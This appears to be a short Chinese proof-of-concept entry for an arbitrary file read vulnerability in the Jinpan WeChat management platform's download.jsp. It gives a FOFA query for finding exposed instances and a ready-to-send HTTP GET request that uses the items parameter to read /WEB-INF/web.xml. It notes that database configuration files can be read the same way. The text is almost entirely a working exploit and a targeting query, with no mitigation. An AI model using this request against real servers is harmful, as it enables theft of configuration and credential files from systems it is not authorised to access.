# 金盘微信管理平台download.jsp任意文件读取漏洞

金盘微信管理平台download.jsp任意文件读取漏洞，通过该漏洞读取数据库配置文件等

## fofa

```javascript
title=="微信管理后台"
```

## poc

```javascript
GET /mobile/pages/admin/tools/file/download.jsp?items=/WEB-INF/web.xml HTTP/1.1
Host: 
```

![image-20241021172734743](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410211727896.png)